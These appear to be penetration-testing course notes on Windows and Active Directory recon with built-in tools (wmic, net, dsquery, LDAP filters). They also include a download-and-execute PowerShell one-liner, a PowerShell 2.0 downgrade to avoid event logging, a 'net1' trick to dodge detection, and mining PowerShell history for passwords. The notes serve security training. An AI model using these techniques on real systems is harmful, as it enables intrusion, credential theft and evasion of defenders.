## Living Off the Land
### Env Commands For Host & Network Recon

|Command|	Result|
|:------|:--------|
|hostname|	Prints the PC's Name|
|[System.Environment]::OSVersion.Version|	Prints out the OS version and revision level|
|wmic qfe get Caption,Description,HotFixID,InstalledOn|	Prints the patches and hotfixes applied to the host|
|ipconfig /all|	Prints out network adapter state and configurations|
|set|	Displays a list of environment variables for the current session (ran from CMD-prompt)|
|echo %USERDOMAIN%|	Displays the domain name to which the host belongs (ran from CMD-prompt)|
|echo %logonserver%|	Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

- We can cover the information above with one command `systeminfo`.

### Harnessing PowerShell

|Cmd-Let|	Description|
|:------|:-------------|
|Get-Module|	Lists available modules loaded for use.|
|Get-ExecutionPolicy -List|	Will print the execution policy settings for each scope on a host.|
|Set-ExecutionPolicy Bypass -Scope Process|	This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
|Get-ChildItem Env: \| ft Key,Value	| Return environment values such as key paths, users, computer information, etc.|
|Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt|	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
|powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"|	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|


- Many defenders are unaware that several versions of PowerShell often exist on a host. 
- Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. 
- If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. 


```powershell
# Downgrade Powershell

PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

```

### Checking Defenses

```powershell
# Firewall checks
PS C:\htb> netsh advfirewall show allprofiles

# Windows Defender Check (from CMD.exe)
C:\htb> sc query windefend

# Check the status and configuration settings
PS C:\htb> Get-MpComputerStatus


```

- Check and see if you are the only one logged in.
```powershell
# Using qwinsta
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen

```

### Network Information

|Networking Commands|	Description |
|:------------------|:--------------|
|arp -a|	Lists all known hosts stored in the arp table.|
|ipconfig /all|	Prints out adapter settings for the host. We can figure out the network segment from here.|
|route print|	Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|netsh advfirewall show allprofiles|	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|


### Windows Management Instrumentation (WMI)
- Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts.

|Command|	Description|
|:------|:-------------|
|wmic qfe get Caption,Description,HotFixID,InstalledOn|	Prints the patch level and description of the Hotfixes applied|
|wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List|	Displays basic host information to include any attributes within the list|
|wmic process list /format:list|	A listing of all processes on host|
|wmic ntdomain list /format:list|	Displays information about the Domain and Domain Controllers|
|wmic useraccount list /format:list|	Displays information about all local accounts and any domain accounts that have logged into the device|
|wmic group list /format:list|	Information about all local groups|
|wmic sysaccount list /format:list|	Dumps information about any system accounts that are being used as service accounts.|

- [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)


### Net Commands
- Table of Useful Net Commands

|Command|	Description|
|:------|:-------------|
|net accounts|	Information about password requirements|
|net accounts /domain|	Password and lockout policy|
|net group /domain|	Information about domain groups|
|net group "Domain Admins" /domain|	List users with domain admin privileges|
|net group "domain computers" /domain|	List of PCs connected to the domain|
|net group "Domain Controllers" /domain|	List PC accounts of domains controllers|
|net group <domain_group_name> /domain|	User that belongs to the group|
|net groups /domain|	List of domain groups|
|net localgroup|	All available groups|
|net localgroup administrators /domain|	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)|
|net localgroup Administrators|	Information about a group (admins)|
|net localgroup administrators [username] /add|	Add user to administrators|
|net share|	Check current shares|
|net user <ACCOUNT_NAME> /domain|	Get information about a user within the domain|
|net user /domain|	List all users of the domain|
|net user %username%|	Information about the current user|
|net use x: \computer\share|	Mount the share locally|
|net view|	Get a list of computers|
|net view /all /domain[:domainname]	|Shares on the domains|
|net view \computer /ALL|	List shares of a computer|
|net view /domain|	List of PCs of the domain|


> [!TIP]
> Net Commands Trick: Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.


### Dsquery
- Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects.
- With that in mind, dsquery will exist on any host with the `Active Directory Domain Services Role` installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.
- All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context.

```powershell
# User Search
PS C:\htb> dsquery user


# Computer Search
PS C:\htb> dsquery computer

# Wildcard Search
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

```

- We can combine dsquery with LDAP search filters of our choosing.
```powershell
# Users With Specific Attributes Set (PASSWD_NOTREQD)
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Searching for Domain Controllers
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

```

- **LDAP Filtering**
    - You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. 
    - These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others.
    - `userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD ,also known as Object Identifiers (OIDs).
    - `=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set.
![UAC-values](/images/UAC-values.jpg)

- **OID match strings**
- OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. 1.2.840.113556.1.4.803
- When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. 1.2.840.113556.1.4.804
- When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. 1.2.840.113556.1.4.1941
- This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

- **Logical Operators**
- When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
- The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. 

